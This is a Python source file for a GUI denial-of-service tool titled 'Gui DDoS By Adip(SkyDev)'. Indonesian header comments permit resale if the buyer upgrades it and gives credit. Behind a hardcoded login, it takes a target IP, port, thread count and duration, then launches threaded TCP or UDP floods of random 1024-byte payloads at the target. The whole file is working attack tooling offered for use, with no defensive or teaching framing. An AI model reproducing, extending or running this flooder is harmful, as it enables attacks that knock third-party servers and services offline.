# Jangan Dijual Bang
# Murni Buatan Gw Ini (Adip)
# Boleh Jual Tapi Ya Di Upgrade Goblok Jangan Rename Doang Idiot, Kasi Credit Jangan Lupa:v Credit: Adip
# Simple Doang Tools Nya, Gaakan Gw Update Lagi Hehehe:v
# Remake Boleh Tapi Credit Nama Gw Ya:v

import PySimpleGUI as sg
import socket
import threading
import random
from time import sleep

blacklist = [
    "1.1.1.1",
    "nasa.gov",
    "fbi.gov"
]
send_attack = 0
username = "Adip"
password = "123"

sg.theme('Dark Grey 13')

def save_log(text):
    file = open("logs.txt", 'a+')
    file.write(text)
    file.close()

def Login():
    global username
    global password
    Login = [
        [sg.Text("Username", size=(15, 1)), sg.Input(key="Username")],
        [sg.Text("Password", size=(15, 1)), sg.Input(key="Password", password_char="*")],
        [sg.Button("Login"), sg.Button("Exit")]
    ]

    Login_window = sg.Window("Login", Login, keep_on_top=True, disable_minimize=True)

    while True:
        Button, args = Login_window.read()
        if Button == sg.WIN_CLOSED or Button == "Exit":
            break
        elif Button == "Login":
            if args["Username"] == username and args["Password"] == password:
                Login_window.close()
                Tools_Menu()
                return True
            else:
                Login_window["Username"].update("")
                Login_window["Password"].update("")
                sg.popup("Wrong Username or Password", keep_on_top=True, title="Login")

def Tools_Menu():
    global send_attack
    Tools = [
        [sg.Text("IP"), sg.Input(key="IP")],
        [sg.Text("Port"), sg.Input(key="Port")],
        [sg.Text("Threads"), sg.Input(key="Threads")],
        [sg.Text("Time"), sg.Input(key="Time")],
        [sg.Text("Methods:")],
        [sg.Checkbox("TCP", key="TCP"), sg.InputOptionMenu(("HTTP", "Coming Soon..."), size=(15, 1), key="type_", default_value="HTTP")],
        [sg.Checkbox("UDP", key="UDP")],
        [sg.Checkbox("OVH", key="OVH")],
        [sg.ProgressBar(max_value=100, orientation='h', size=(40, 20), key='progress_1'), sg.Text("0%", key="progress_text"), sg.Text(f"Sent: {send_attack}", key="sent")],
        [sg.Output(size=(100,10), key='log')],
        [sg.Button("Sent"), sg.Button("Clear Log", key="clear_log"), sg.Button("Exit")]
    ]

    windows = sg.Window('Gui DDoS By Adip(SkyDev)', Tools, grab_anywhere=True, font=("Helvetica", 12), auto_size_buttons=False, keep_on_top=True, disable_minimize=True)

    while True:
        Button, args = windows.read()
        if Button == sg.WIN_CLOSED or Button == "Exit" or Button is None:
            file = open("logs.txt", "r+")
            file.truncate(0)
            file.close()
            break
        elif Button == "clear_log":
            file = open("logs.txt", "r+")
            file.truncate(0)
            file.close()
        elif args["TCP"] == True and args["UDP"] == True and args["OVH"] == True:
            windows["TCP"].update(False)
            windows["UDP"].update(False)
            windows["OVH"].update(False)
            save_log("[ERROR] Please Select Only One Method\n")
            windows["log"].update(open("logs.txt").read()) # update log
        elif args["TCP"] == False and args["UDP"] == False and args["OVH"] == False:
            save_log("[ERROR] Please Select Method\n")
            windows["log"].update(open("logs.txt").read()) # update log
        elif Button == "Sent":
            if args["IP"] == "":
                save_log("[ERROR] Please Enter IP\n")
                windows["log"].update(open("logs.txt").read()) # update log
            elif args["IP"] == "127.0.0.1" or args["IP"] == "localhost":
                save_log("[ERROR] You Can't Attack Your Self\n")
                windows["log"].update(open("logs.txt").read()) # update log
            elif args["IP"] == blacklist[0] or args["IP"] == blacklist[1] or args["IP"] == blacklist[2]:
                save_log("[ERROR] IP is Blacklisted\n")
                windows["log"].update(open("logs.txt").read()) # update log
            elif args["Port"] == "":
                save_log("[ERROR] Please Enter Port\n")
                windows["log"].update(open("logs.txt").read()) # update log
            elif args["Threads"] == "":
                save_log("[ERROR] Please Enter Threads\n")
                windows["log"].update(open("logs.txt").read()) # update log
            elif args["Time"] == "":
                save_log("[ERROR] Please Enter Time\n")
                windows["log"].update(open("logs.txt").read()) # update log
            elif args["Port"].isnumeric() == False:
                save_log("[ERROR] Please Enter Port Number\n")
                windows["log"].update(open("logs.txt").read()) # update log
            elif args["Threads"].isnumeric() == False:
                save_log("[ERROR] Please Enter Threads Number\n")
                windows["log"].update(open("logs.txt").read()) # update log
            elif args["Time"].isnumeric() == False:
                save_log("[ERROR] Please Enter Time Number\n")
                windows["log"].update(open("logs.txt").read()) # update log
            else:
                IP = args["IP"]
                Port = args["Port"]
                Threads = args["Threads"]
                Time = args["Time"]
                if args["TCP"] == True:
                    for i in range(101):
                        sleep(0.1)
                        windows["progress_1"].update_bar(i)
                        windows["progress_text"].update(str(i) + "%")
                        if i == 100:
                            windows["progress_1"].update_bar(0)
                            windows["progress_text"].update("0%")
                            save_log(f"[+] Attack Sent To {IP}:{Port} With {Threads} Threads And {Time} Seconds\n")
                            windows["log"].update(open("logs.txt").read()) # update log
                            break
                    for i in range(int(Threads)):
                        t = threading.Thread(target=TCP_HTTP, args=(IP, Port, Time))
                        t.start()
                        send_attack += 1
                        windows["sent"].update(f"Sent: {send_attack}")
                elif args["UDP"] == True:
                    for i in range(101):
                        sleep(0.1)
                        windows["progress_1"].update_bar(i)
                        windows["progress_text"].update(str(i) + "%")
                        if i == 100:
                            windows["progress_1"].update_bar(0)
                            windows["progress_text"].update("0%")
                            save_log(f"[+] Attack Sent To {IP}:{Port} With {Threads} Threads And {Time} Seconds\n")
                            windows["log"].update(open("logs.txt").read()) # update log
                            break
                    for i in range(int(Threads)):
                        t = threading.Thread(target=UDP_HTTP, args=(IP, Port, Time))
                        t.start()
                        send_attack += 1
                        windows["sent"].update(f"Sent: {send_attack}")

                elif args["OVH"] == True:
                    save_log("[ERROR] OVH Method Not Available\n")
                    windows["log"].update(open("logs.txt").read()) # update log
                    
        windows["log"].update(open("logs.txt").read()) # update log

        


def TCP_HTTP(IP, Port, Time):
    global send_attack
    try:
        data = random._urandom(1024)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, int(Port)))
        s.send(data)
        for i in range(int(Time)):
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
    except:
        pass
    finally:
        s.close()

def UDP_HTTP(IP, Port, Time):
    global send_attack
    try:
        data = random._urandom(1024)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((IP, int(Port)))
        s.send(data)
        for i in range(int(Time)):
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
    except:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    Login()
